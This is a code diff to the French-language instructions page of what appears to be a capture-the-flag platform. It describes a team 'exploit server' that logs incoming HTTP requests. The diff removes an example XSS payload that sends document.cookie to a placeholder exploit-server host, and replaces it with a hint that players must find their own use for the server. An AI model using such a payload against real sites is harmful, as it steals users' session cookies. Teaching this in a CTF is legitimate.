@@ -76,12 +76,8 @@ export default function Instructions() {
       <div className="card p-8 mb-8 border-terracotta/20">
         <h2 className="font-heading font-bold text-xl mb-6 text-terracotta">Exploit Server</h2>
         <div className="text-sm text-white/70 space-y-3 leading-relaxed">
-          <p>Votre équipe dispose d'un serveur d'exploitation dédié qui agit comme récepteur de webhooks. Utilisez-le pour exfiltrer des données lors d'attaques XSS.</p>
-          <div className="p-4 bg-white/[0.03] rounded-lg font-mono text-xs space-y-2">
-            <p className="text-white/40"># Exemple : exfiltrer des cookies via XSS</p>
-            <p className="text-accent">&lt;img src=x onerror="fetch('http://YOUR_EXPLOIT_SERVER/hook?c='+document.cookie)"&gt;</p>
-          </div>
-          <p>Accédez au tableau de bord de votre serveur d'exploitation pour voir les requêtes entrantes en temps réel.</p>
+          <p>Votre équipe dispose d'un serveur d'exploitation dédié qui agit comme récepteur de webhooks. Toute requête HTTP envoyée à ce serveur sera enregistrée et affichée en temps réel.</p>
+          <p>Accédez au tableau de bord de votre serveur d'exploitation pour voir les requêtes entrantes. À vous de trouver comment l'utiliser...</p>
         </div>
       </div>
     </div>
